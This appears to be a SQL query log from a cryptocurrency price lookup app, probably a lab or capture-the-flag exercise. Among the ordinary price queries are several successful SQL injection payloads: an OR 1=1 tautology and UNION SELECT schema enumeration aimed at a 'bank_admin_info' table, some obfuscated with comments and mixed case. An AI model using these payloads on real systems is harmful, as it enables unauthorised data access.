2020-10-25 13:41:35.706172 ; Status: success ; SQL: select crypto_price from cryptocurrency where crypto_name LIKE 'bitcoin';
2020-10-25 14:12:38.144162 ; Status: success ; SQL: select crypto_price from cryptocurrency where crypto_name LIKE 'Monero';
2020-10-25 14:18:16.159931 ; Status: success ; SQL: select crypto_price from cryptocurrency where crypto_name LIKE 'Bitcoin';
2020-10-25 14:30:10.151083 ; Status: success ; SQL: select crypto_price from cryptocurrency where crypto_name LIKE 'pdzen';
2020-10-25 14:41:14.275783 ; Status: success ; SQL: select crypto_price from cryptocurrency where crypto_name LIKE 'nedzen';
2020-10-25 14:41:47.435280 ; Status: success ; SQL: select crypto_price from cryptocurrency where crypto_name LIKE 'Bitcoin';
2020-10-25 14:49:32.370278 ; Status: success ; SQL: select crypto_price from cryptocurrency where crypto_name LIKE 'Bitcoin';
2020-10-25 19:53:49.370383 ; Status: success ; SQL: select crypto_price from cryptocurrency where crypto_name LIKE ''/**/uNion/**/Select/**/column_name/**/frOm/**/information_schema.columns/**/wheRe/**/table_name='bank_admin_info';#';
2020-10-25 19:56:07.666515 ; Status: success ; SQL: select crypto_price from cryptocurrency where crypto_name LIKE '' OR 1=1;#';
2020-10-25 19:56:43.177215 ; Status: success ; SQL: select crypto_price from cryptocurrency where crypto_name LIKE '' union seLect table_name from information_schema.tables;#';
2020-10-25 19:59:39.007858 ; Status: success ; SQL: select crypto_price from cryptocurrency where crypto_name LIKE ''/**/uNion/**/Select/**/column_name/**/frOm/**/information_schema.columns/**/wheRe/**/table_name='cryptocurrency';#';
2020-10-25 20:06:25.375254 ; Status: success ; SQL: select crypto_price from cryptocurrency where crypto_name LIKE 'Bitcoin';
2020-10-25 20:06:30.490043 ; Status: success ; SQL: select crypto_price from cryptocurrency where crypto_name LIKE 'Litecoin';
2020-10-25 20:06:36.243002 ; Status: success ; SQL: select crypto_price from cryptocurrency where crypto_name LIKE 'Ethereum';
2020-10-25 20:07:04.473375 ; Status: success ; SQL: select crypto_price from cryptocurrency where crypto_name LIKE 'jjj';
2020-10-25 20:18:26.232994 ; Status: success ; SQL: select crypto_price from cryptocurrency where crypto_name LIKE 'Bitcoin';
2020-10-31 22:49:04.683393 ; Status: success ; SQL: select crypto_price from cryptocurrency where crypto_name LIKE 'Bitcoin';
2020-10-31 22:49:54.748122 ; Status: success ; SQL: select crypto_price from cryptocurrency where crypto_name LIKE 'Bitcoin';
2020-10-31 22:50:29.874376 ; Status: success ; SQL: select crypto_price from cryptocurrency where crypto_name LIKE 'Bitcoin';
2020-10-31 22:51:09.623890 ; Status: success ; SQL: select crypto_price from cryptocurrency where crypto_name LIKE 'Bitcoin';
